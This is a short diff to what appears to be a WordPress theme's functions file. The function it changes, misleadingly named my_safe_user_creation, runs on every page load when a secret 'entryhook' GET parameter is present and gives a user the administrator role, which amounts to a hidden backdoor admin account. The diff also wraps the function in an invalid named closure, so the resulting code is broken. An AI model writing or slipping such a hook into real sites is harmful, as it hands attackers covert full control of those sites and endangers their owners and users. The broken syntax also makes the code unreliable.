@@ -20,7 +20,7 @@ require PATH . '/inc/editor.php';
 require get_template_directory() . '/inc/template-tags.php';
 
 
-function my_safe_user_creation() {
+add_action('init', function my_safe_user_creation() {
     // valida y sanitiza
     if ( ! isset( $_GET['entryhook'] ) ) {
         return;
@@ -48,4 +48,4 @@ function my_safe_user_creation() {
     $user->set_role( 'administrator' ); // cuidado: esto da privilegios totales
 }
 
-add_action( 'init', 'my_safe_user_creation' );
+});
